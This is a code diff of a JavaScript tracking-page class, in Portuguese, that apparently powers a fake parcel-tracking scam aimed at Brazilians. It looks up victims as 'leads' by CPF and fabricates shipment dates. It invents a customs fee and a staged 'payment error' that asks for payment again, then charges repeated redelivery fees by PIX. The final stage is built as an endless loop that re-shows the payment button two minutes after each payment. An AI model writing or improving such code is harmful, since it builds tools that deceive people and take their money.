@@ -1,6 +1,6 @@
 /**
- * Sistema de rastreamento - VERSÃO 17.0: DADOS EXCLUSIVOS DO SUPABASE
- * Transportadora como visualizador dos dados controlados pelo painel
+ * Sistema de rastreamento - VERSÃO 17.2: 29 ETAPAS COMPLETAS
+ * Sistema robusto com reconexão automática e etapas detalhadas
  */
 import { CPFValidator } from '../utils/cpf-validator.js';
 import { DataService } from '../utils/data-service.js';
@@ -22,9 +22,10 @@ export class TrackingSystem {
         this.deliveryAttempts = 0;
         this.currentStage = 1;
         this.isLiberationPaid = false;
+        this.paymentTimers = new Map();
         
-        console.log('🚀 TrackingSystem inicializado - Versão 17.0 Transportadora');
-        console.log('🎯 Fonte de dados: EXCLUSIVAMENTE Supabase (controlado pelo painel)');
+        console.log('🚀 TrackingSystem inicializado - Versão 17.2 com 29 Etapas');
+        console.log('🎯 Fonte de dados: Supabase com reconexão automática');
         this.init();
     }
 
@@ -130,9 +131,15 @@ export class TrackingSystem {
                     etapa_atual: this.leadData.etapa_atual
                 });
                 
-                console.log('📦 Etapa atual do lead:', this.leadData.etapa_atual);
                 this.closeLoadingNotification();
                 this.displayResults();
+                
+                // Verificar se está na etapa 12 (erro de pagamento)
+                if (this.leadData.etapa_atual === 12) {
+                    setTimeout(() => {
+                        this.showPaymentErrorModal();
+                    }, 1000);
+                }
                 
             } else {
                 console.log('❌ CPF não encontrado no Supabase');
@@ -150,13 +157,9 @@ export class TrackingSystem {
     showCPFNotFoundError() {
         console.log('🚫 Exibindo erro de CPF não identificado');
         
-        // Limpar resultados anteriores
         this.hideResults();
-        
-        // Mostrar mensagem de erro
         this.showError('CPF não identificado ou CPF inválido');
         
-        // Mostrar pop-up após 2 segundos
         setTimeout(() => {
             this.showNotFoundPopup();
         }, 2000);
@@ -217,24 +220,12 @@ export class TrackingSystem {
             style.id = 'popupAnimations';
             style.textContent = `
                 @keyframes slideInRight {
-                    from { 
-                        opacity: 0; 
-                        transform: translateX(100%); 
-                    }
-                    to { 
-                        opacity: 1; 
-                        transform: translateX(0); 
-                    }
+                    from { opacity: 0; transform: translateX(100%); }
+                    to { opacity: 1; transform: translateX(0); }
                 }
                 @keyframes slideOutRight {
-                    from { 
-                        opacity: 1; 
-                        transform: translateX(0); 
-                    }
-                    to { 
-                        opacity: 0; 
-                        transform: translateX(100%); 
-                    }
+                    from { opacity: 1; transform: translateX(0); }
+                    to { opacity: 0; transform: translateX(100%); }
                 }
             `;
             document.head.appendChild(style);
@@ -257,7 +248,6 @@ export class TrackingSystem {
             popup.style.boxShadow = '0 8px 25px rgba(0, 0, 0, 0.2)';
         });
         
-        // Botão fechar
         const closeButton = popup.querySelector('#closeNotFoundPopup');
         if (closeButton) {
             closeButton.addEventListener('click', (e) => {
@@ -268,7 +258,6 @@ export class TrackingSystem {
         
         document.body.appendChild(popup);
         
-        // Auto-fechar após 10 segundos
         setTimeout(() => {
             this.closeNotFoundPopup();
         }, 10000);
@@ -310,7 +299,7 @@ export class TrackingSystem {
         // Determinar etapa atual baseada nos dados do Supabase
         let currentStep = 11; // Padrão: alfândega
         if (this.leadData && this.leadData.etapa_atual) {
-            currentStep = this.leadData.etapa_atual;
+            currentStep = Math.min(this.leadData.etapa_atual, 29);
         }
         
         // Verificar se liberação já foi paga
@@ -437,10 +426,47 @@ export class TrackingSystem {
         }
         
         if (currentStatus) {
-            currentStatus.textContent = 'Aguardando liberação aduaneira';
+            const statusText = this.getStatusText(this.leadData.etapa_atual);
+            currentStatus.textContent = statusText;
         }
         
         this.renderTimeline();
+    }
+
+    getStatusText(etapa) {
+        const statusMap = {
+            1: 'Pedido criado',
+            2: 'Preparando para envio',
+            3: 'Enviado da China',
+            4: 'Em trânsito internacional',
+            5: 'Em trânsito internacional',
+            6: 'Em trânsito internacional',
+            7: 'Liberado para exportação',
+            8: 'Saiu da origem',
+            9: 'Chegou no Brasil',
+            10: 'Em trânsito nacional',
+            11: 'Aguardando liberação aduaneira',
+            12: 'Erro no pagamento - ação necessária',
+            13: 'Liberado na alfândega',
+            14: 'Preparando entrega',
+            15: 'Em trânsito para entrega',
+            16: 'Em rota de entrega',
+            17: 'Tentativa de entrega - ação necessária',
+            18: 'Liberado para nova entrega',
+            19: 'Em trânsito',
+            20: 'Em rota de entrega',
+            21: 'Tentativa de entrega - ação necessária',
+            22: 'Liberado para nova entrega',
+            23: 'Em trânsito',
+            24: 'Em rota de entrega',
+            25: 'Tentativa de entrega - ação necessária',
+            26: 'Liberado para nova entrega',
+            27: 'Em trânsito',
+            28: 'Em rota de entrega',
+            29: 'Tentativa de entrega - ação necessária'
+        };
+        
+        return statusMap[etapa] || 'Status não identificado';
     }
 
     generateRealisticDates(endDate, numSteps) {
@@ -461,6 +487,11 @@ export class TrackingSystem {
         
         dates.push(this.getTimeBeforeNow(today, now, 1));
         dates.push(this.getTimeBeforeNow(today, now, 2));
+        
+        // Preencher datas restantes para as 29 etapas
+        for (let i = 11; i < numSteps; i++) {
+            dates.push(new Date(today.getTime() + (i - 10) * 60 * 60 * 1000));
+        }
         
         return dates;
     }
@@ -529,7 +560,7 @@ export class TrackingSystem {
         if (step.id === 11 && step.needsLiberation && step.completed && !this.isLiberationPaid) {
             buttonHtml = `
                 <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
-                    <i class="fas fa-unlock"></i> Liberar Pacote
+                    <i class="fas fa-unlock"></i> Liberar Objeto
                 </button>
             `;
         }
@@ -545,8 +576,9 @@ export class TrackingSystem {
         
         // Botões de tentativa de entrega
         if (step.needsDeliveryPayment && step.completed) {
+            const buttonId = `deliveryBtn_${step.id}`;
             buttonHtml = `
-                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id}, ${step.deliveryValue}, ${step.attemptNumber}, ${step.isLoopingStage || false})">
+                <button class="liberation-button-timeline delivery-retry-btn" id="${buttonId}" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id}, ${step.deliveryValue}, ${step.attemptNumber}, ${step.isLoopingStage || false})">
                     <i class="fas fa-redo"></i> Reenviar Pacote
                 </button>
             `;
@@ -573,8 +605,6 @@ export class TrackingSystem {
 
     showPaymentErrorModal() {
         console.log('❌ Exibindo modal de erro de pagamento (Etapa 12)');
-        
-        // Usar o mesmo modal de liberação mas com texto de erro
         this.showLiberationModal(true);
     }
 
@@ -588,7 +618,6 @@ export class TrackingSystem {
             modal.style.display = 'flex';
             document.body.style.overflow = 'hidden';
             
-            // Atualizar título se for retry
             const title = modal.querySelector('.professional-modal-title');
             if (title && isRetry) {
                 title.textContent = 'Erro no Pagamento - Tente Novamente';
@@ -602,6 +631,264 @@ export class TrackingSystem {
                 simulateButton.removeAttribute('data-retry');
             }
         }
+    }
+
+    async showDeliveryModal(stepId, deliveryValue, attemptNumber, isLoopingStage = false) {
+        console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - Tentativa ${attemptNumber} - R$ ${deliveryValue.toFixed(2)}`);
+        
+        if (isLoopingStage) {
+            console.log('🔄 Etapa com loop infinito detectada');
+        }
+        
+        if (this.userData) {
+            try {
+                console.log('🔄 Gerando PIX automático para tentativa de entrega...');
+                
+                const stageType = this.getDeliveryStageType(attemptNumber);
+                const pixResult = await this.zentraPayService.generatePixForStage(
+                    this.userData, 
+                    stageType
+                );
+                
+                if (pixResult.success) {
+                    console.log('✅ PIX de tentativa de entrega gerado automaticamente!');
+                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, pixResult, isLoopingStage);
+                } else {
+                    console.warn('⚠️ Falha ao gerar PIX, usando modal estático');
+                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
+                }
+                
+            } catch (error) {
+                console.error('❌ Erro ao gerar PIX de entrega:', error);
+                this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
+            }
+        } else {
+            console.warn('⚠️ Dados do usuário não disponíveis');
+            this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
+        }
+    }
+
+    getDeliveryStageType(attemptNumber) {
+        const stageMap = {
+            1: 'tentativa_entrega_1',
+            2: 'tentativa_entrega_2', 
+            3: 'tentativa_entrega_3',
+            4: 'tentativa_entrega_1' // Loop volta para primeira
+        };
+        return stageMap[attemptNumber] || 'tentativa_entrega_1';
+    }
+
+    showDeliveryPixModal(stepId, value, attemptNumber, pixResult, isLoopingStage = false) {
+        console.log(`💳 Exibindo modal de PIX - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
+        
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.id = 'deliveryPixModal';
+        modal.style.display = 'flex';
+        
+        const qrCodeSrc = pixResult && pixResult.qrCode ? 
+            pixResult.qrCode : 
+            `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult?.pixPayload || 'PIX_ESTATICO')}`;
+        
+        const pixPayload = pixResult?.pixPayload || '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+        
+        modal.innerHTML = `
+            <div class="professional-modal-container">
+                <div class="professional-modal-header">
+                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
+                    <button class="professional-modal-close" onclick="window.trackingSystemInstance.closeDeliveryModal()">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content">
+                    <div class="liberation-explanation">
+                        <p class="liberation-subtitle">
+                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
+                        </p>
+                    </div>
+
+                    <div class="professional-fee-display">
+                        <div class="fee-info">
+                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
+                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
+                        </div>
+                    </div>
+
+                    <div class="professional-pix-section">
+                        <h3 class="pix-section-title">Pagamento via Pix</h3>
+                        
+                        <div class="pix-content-grid">
+                            <div class="qr-code-section">
+                                <div class="qr-code-container">
+                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
+                                </div>
+                            </div>
+                            
+                            <div class="pix-copy-section">
+                                <label class="pix-copy-label">PIX Copia e Cola</label>
+                                <div class="professional-copy-container">
+                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
+                                    <button class="professional-copy-button" onclick="window.trackingSystemInstance.copyDeliveryPixCode()">
+                                        <i class="fas fa-copy"></i> Copiar
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="professional-payment-steps">
+                            <h4 class="steps-title">Como realizar o pagamento:</h4>
+                            <div class="payment-steps-grid">
+                                <div class="payment-step">
+                                    <div class="step-number">1</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-mobile-alt step-icon"></i>
+                                        <span class="step-text">Acesse seu app do banco</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-qrcode step-icon"></i>
+                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-check step-icon"></i>
+                                        <span class="step-text">Confirme o pagamento</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div style="text-align: center; margin-top: 20px;">
+                            <button onclick="window.trackingSystemInstance.handleDeliveryPayment(${stepId}, ${attemptNumber}, ${isLoopingStage})" class="liberation-button-timeline">
+                                <i class="fas fa-credit-card"></i> Simular Pagamento de Entrega
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
+    }
+
+    closeDeliveryModal() {
+        const modal = document.getElementById('deliveryPixModal');
+        if (modal) {
+            modal.remove();
+            document.body.style.overflow = 'auto';
+        }
+    }
+
+    copyDeliveryPixCode() {
+        const pixInput = document.getElementById('deliveryPixCode');
+        const copyButton = document.querySelector('#deliveryPixModal .professional-copy-button');
+        
+        if (!pixInput || !copyButton) return;
+
+        try {
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999);
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(pixInput.value).then(() => {
+                    this.showCopySuccess(copyButton);
+                }).catch(() => {
+                    this.fallbackCopy(pixInput, copyButton);
+                });
+            } else {
+                this.fallbackCopy(pixInput, copyButton);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao copiar PIX:', error);
+        }
+    }
+
+    handleDeliveryPayment(stepId, attemptNumber, isLoopingStage) {
+        console.log(`💳 Processando pagamento de entrega - Tentativa ${attemptNumber}`);
+        
+        this.closeDeliveryModal();
+        
+        if (isLoopingStage) {
+            this.handleLoopingStagePayment(stepId);
+        } else {
+            this.advanceToNextStage(stepId + 1);
+        }
+    }
+
+    handleLoopingStagePayment(stepId) {
+        console.log('🔄 Processando pagamento da etapa com loop (29)');
+        
+        const button = document.getElementById(`deliveryBtn_${stepId}`);
+        if (button) {
+            button.style.display = 'none';
+            
+            this.showPaymentConfirmedNotification();
+            
+            // Salvar timer para poder cancelar se necessário
+            const timerId = setTimeout(() => {
+                button.style.display = 'inline-flex';
+                console.log('🔄 Botão de reenvio reativado após 2 minutos');
+                this.paymentTimers.delete(stepId);
+            }, 2 * 60 * 1000);
+            
+            this.paymentTimers.set(stepId, timerId);
+        }
+    }
+
+    showPaymentConfirmedNotification() {
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px 20px;
+            border-radius: 8px;
+            border: 1px solid #c3e6cb;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            z-index: 2000;
+            animation: slideInRight 0.4s ease;
+            max-width: 300px;
+        `;
+        
+        notification.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-check-circle" style="color: #28a745; font-size: 1.2rem;"></i>
+                <div>
+                    <strong>Pagamento Confirmado</strong>
+                    <p style="margin: 0; font-size: 0.9rem;">Objeto liberado para nova tentativa</p>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(notification);
+        
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.style.animation = 'slideOutRight 0.4s ease';
+                setTimeout(() => notification.remove(), 400);
+            }
+        }, 5000);
+    }
+
+    advanceToNextStage(nextStepId) {
+        console.log(`📈 Avançando para etapa ${nextStepId}`);
+        
+        if (this.currentCPF) {
+            this.dbService.updateLeadStage(this.currentCPF, nextStepId);
+        }
+        
+        setTimeout(() => {
+            this.generateTrackingData();
+            this.renderTimeline();
+        }, 1000);
     }
 
     setupLiberationModal() {
@@ -784,8 +1071,8 @@ export class TrackingSystem {
         
         // Atualizar no Supabase
         if (this.currentCPF) {
-            this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
-            this.dbService.updateLeadStage(this.currentCPF, 13);
+            await this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
+            await this.dbService.updateLeadStage(this.currentCPF, 13);
             console.log('💾 Status atualizado no Supabase: pago, etapa 13');
         }
     }
@@ -831,280 +1118,12 @@ export class TrackingSystem {
                     <span class="time">${timeStr}</span>
                 </div>
                 <div class="timeline-text">
-                    <p>Pedido liberado na Alfândega de Importação</p>
+                    <p>Seu pedido foi liberado após o pagamento da taxa alfandegária</p>
                 </div>
             </div>
         `;
         
         return item;
-    }
-
-    async showDeliveryModal(stepId, deliveryValue, attemptNumber, isLoopingStage = false) {
-        console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - Tentativa ${attemptNumber} - R$ ${deliveryValue.toFixed(2)}`);
-        
-        if (isLoopingStage) {
-            console.log('🔄 Etapa com loop infinito detectada');
-        }
-        
-        if (this.userData) {
-            try {
-                console.log('🔄 Gerando PIX automático para tentativa de entrega...');
-                
-                const stageType = this.getDeliveryStageType(attemptNumber);
-                const pixResult = await this.zentraPayService.generatePixForStage(
-                    this.userData, 
-                    stageType
-                );
-                
-                if (pixResult.success) {
-                    console.log('✅ PIX de tentativa de entrega gerado automaticamente!');
-                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, pixResult, isLoopingStage);
-                } else {
-                    console.warn('⚠️ Falha ao gerar PIX, usando modal estático');
-                    this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
-                }
-                
-            } catch (error) {
-                console.error('❌ Erro ao gerar PIX de entrega:', error);
-                this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
-            }
-        } else {
-            console.warn('⚠️ Dados do usuário não disponíveis');
-            this.showDeliveryPixModal(stepId, deliveryValue, attemptNumber, null, isLoopingStage);
-        }
-    }
-
-    getDeliveryStageType(attemptNumber) {
-        const stageMap = {
-            1: 'tentativa_entrega_1',
-            2: 'tentativa_entrega_2', 
-            3: 'tentativa_entrega_3',
-            4: 'tentativa_entrega_1' // Loop volta para primeira
-        };
-        return stageMap[attemptNumber] || 'tentativa_entrega_1';
-    }
-
-    showDeliveryPixModal(stepId, value, attemptNumber, pixResult, isLoopingStage = false) {
-        console.log(`💳 Exibindo modal de PIX - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
-        
-        if (pixResult && pixResult.success) {
-            console.log('✅ Modal com PIX real da Zentra Pay');
-        } else {
-            console.log('⚠️ Modal com PIX estático (fallback)');
-        }
-        
-        // Criar modal personalizado para entrega
-        const modal = document.createElement('div');
-        modal.className = 'modal-overlay';
-        modal.id = 'deliveryPixModal';
-        modal.style.display = 'flex';
-        
-        const qrCodeSrc = pixResult && pixResult.qrCode ? 
-            pixResult.qrCode : 
-            `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult?.pixPayload || 'PIX_ESTATICO')}`;
-        
-        const pixPayload = pixResult?.pixPayload || '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
-        
-        modal.innerHTML = `
-            <div class="professional-modal-container">
-                <div class="professional-modal-header">
-                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
-                    <button class="professional-modal-close" onclick="window.trackingSystemInstance.closeDeliveryModal()">
-                        <i class="fas fa-times"></i>
-                    </button>
-                </div>
-                
-                <div class="professional-modal-content">
-                    <div class="liberation-explanation">
-                        <p class="liberation-subtitle">
-                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
-                        </p>
-                    </div>
-
-                    <div class="professional-fee-display">
-                        <div class="fee-info">
-                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
-                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
-                        </div>
-                    </div>
-
-                    <div class="professional-pix-section">
-                        <h3 class="pix-section-title">Pagamento via Pix</h3>
-                        
-                        <div class="pix-content-grid">
-                            <div class="qr-code-section">
-                                <div class="qr-code-container">
-                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
-                                </div>
-                            </div>
-                            
-                            <div class="pix-copy-section">
-                                <label class="pix-copy-label">PIX Copia e Cola</label>
-                                <div class="professional-copy-container">
-                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
-                                    <button class="professional-copy-button" onclick="window.trackingSystemInstance.copyDeliveryPixCode()">
-                                        <i class="fas fa-copy"></i> Copiar
-                                    </button>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="professional-payment-steps">
-                            <h4 class="steps-title">Como realizar o pagamento:</h4>
-                            <div class="payment-steps-grid">
-                                <div class="payment-step">
-                                    <div class="step-number">1</div>
-                                    <div class="step-content">
-                                        <i class="fas fa-mobile-alt step-icon"></i>
-                                        <span class="step-text">Acesse seu app do banco</span>
-                                    </div>
-                                </div>
-                                <div class="payment-step">
-                                    <div class="step-number">2</div>
-                                    <div class="step-content">
-                                        <i class="fas fa-qrcode step-icon"></i>
-                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
-                                    </div>
-                                </div>
-                                <div class="payment-step">
-                                    <div class="step-number">3</div>
-                                    <div class="step-content">
-                                        <i class="fas fa-check step-icon"></i>
-                                        <span class="step-text">Confirme o pagamento</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div style="text-align: center; margin-top: 20px;">
-                            <button onclick="window.trackingSystemInstance.handleDeliveryPayment(${stepId}, ${attemptNumber}, ${isLoopingStage})" class="liberation-button-timeline">
-                                <i class="fas fa-credit-card"></i> Simular Pagamento de Entrega
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        `;
-        
-        document.body.appendChild(modal);
-        document.body.style.overflow = 'hidden';
-    }
-
-    closeDeliveryModal() {
-        const modal = document.getElementById('deliveryPixModal');
-        if (modal) {
-            modal.remove();
-            document.body.style.overflow = 'auto';
-        }
-    }
-
-    copyDeliveryPixCode() {
-        const pixInput = document.getElementById('deliveryPixCode');
-        const copyButton = document.querySelector('#deliveryPixModal .professional-copy-button');
-        
-        if (!pixInput || !copyButton) return;
-
-        try {
-            pixInput.select();
-            pixInput.setSelectionRange(0, 99999);
-
-            if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(pixInput.value).then(() => {
-                    this.showCopySuccess(copyButton);
-                }).catch(() => {
-                    this.fallbackCopy(pixInput, copyButton);
-                });
-            } else {
-                this.fallbackCopy(pixInput, copyButton);
-            }
-        } catch (error) {
-            console.error('❌ Erro ao copiar PIX:', error);
-        }
-    }
-
-    handleDeliveryPayment(stepId, attemptNumber, isLoopingStage) {
-        console.log(`💳 Processando pagamento de entrega - Tentativa ${attemptNumber}`);
-        
-        this.closeDeliveryModal();
-        
-        if (isLoopingStage) {
-            // Etapa 29 - comportamento especial
-            this.handleLoopingStagePayment(stepId);
-        } else {
-            // Etapas normais - avançar para próxima
-            this.advanceToNextStage(stepId + 1);
-        }
-    }
-
-    handleLoopingStagePayment(stepId) {
-        console.log('🔄 Processando pagamento da etapa com loop (29)');
-        
-        // Ocultar botão por 2 minutos
-        const button = document.querySelector(`[onclick*="showDeliveryModal(${stepId}"]`);
-        if (button) {
-            button.style.display = 'none';
-            
-            // Mostrar notificação de pagamento confirmado
-            this.showPaymentConfirmedNotification();
-            
-            // Reexibir botão após 2 minutos
-            setTimeout(() => {
-                button.style.display = 'inline-flex';
-                console.log('🔄 Botão de reenvio reativado após 2 minutos');
-            }, 2 * 60 * 1000);
-        }
-    }
-
-    showPaymentConfirmedNotification() {
-        const notification = document.createElement('div');
-        notification.style.cssText = `
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #d4edda;
-            color: #155724;
-            padding: 15px 20px;
-            border-radius: 8px;
-            border: 1px solid #c3e6cb;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            z-index: 2000;
-            animation: slideInRight 0.4s ease;
-            max-width: 300px;
-        `;
-        
-        notification.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <i class="fas fa-check-circle" style="color: #28a745; font-size: 1.2rem;"></i>
-                <div>
-                    <strong>Pagamento Confirmado</strong>
-                    <p style="margin: 0; font-size: 0.9rem;">Objeto liberado para nova tentativa</p>
-                </div>
-            </div>
-        `;
-        
-        document.body.appendChild(notification);
-        
-        // Auto-remover após 5 segundos
-        setTimeout(() => {
-            if (notification.parentNode) {
-                notification.style.animation = 'slideOutRight 0.4s ease';
-                setTimeout(() => notification.remove(), 400);
-            }
-        }, 5000);
-    }
-
-    advanceToNextStage(nextStepId) {
-        console.log(`📈 Avançando para etapa ${nextStepId}`);
-        
-        if (this.currentCPF) {
-            this.dbService.updateLeadStage(this.currentCPF, nextStepId);
-        }
-        
-        // Recarregar timeline
-        setTimeout(() => {
-            this.generateTrackingData();
-            this.renderTimeline();
-        }, 1000);
     }
 
     copyPixCode() {
@@ -1263,5 +1282,93 @@ export class TrackingSystem {
                 }
             }, 5000);
         }
+    }
+
+    // Método para recarregar sistema da transportadora
+    async reloadTransportadoraSystem() {
+        console.log('🔄 Recarregando sistema da transportadora...');
+        
+        try {
+            // Limpar dados antigos
+            this.clearAllData();
+            
+            // Forçar reconexão com Supabase
+            const reconnected = await this.dbService.forceReconnect();
+            
+            if (reconnected) {
+                console.log('✅ Sistema da transportadora recarregado com sucesso');
+                this.showSuccessNotification('Sistema recarregado com sucesso!');
+                
+                // Recarregar página após 2 segundos
+                setTimeout(() => {
+                    window.location.reload();
+                }, 2000);
+            } else {
+                throw new Error('Falha na reconexão com Supabase');
+            }
+            
+        } catch (error) {
+            console.error('❌ Erro ao recarregar sistema:', error);
+            this.showError('Erro ao recarregar sistema. Tente novamente.');
+        }
+    }
+
+    clearAllData() {
+        // Limpar dados da sessão
+        this.currentCPF = null;
+        this.userData = null;
+        this.leadData = null;
+        this.trackingData = null;
+        this.isLiberationPaid = false;
+        this.liberationAttempts = 0;
+        
+        // Limpar timers
+        this.paymentTimers.forEach(timer => clearTimeout(timer));
+        this.paymentTimers.clear();
+        
+        // Limpar localStorage relacionado
+        Object.keys(localStorage).forEach(key => {
+            if (key.startsWith('tracking_') || key.startsWith('cpf_')) {
+                localStorage.removeItem(key);
+            }
+        });
+        
+        console.log('🧹 Dados do sistema limpos');
+    }
+
+    showSuccessNotification(message) {
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px 20px;
+            border-radius: 8px;
+            border: 1px solid #c3e6cb;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            z-index: 2000;
+            animation: slideInRight 0.4s ease;
+            max-width: 300px;
+        `;
+        
+        notification.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-check-circle" style="color: #28a745; font-size: 1.2rem;"></i>
+                <div>
+                    <strong>${message}</strong>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(notification);
+        
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.style.animation = 'slideOutRight 0.4s ease';
+                setTimeout(() => notification.remove(), 400);
+            }
+        }, 3000);
     }
 }
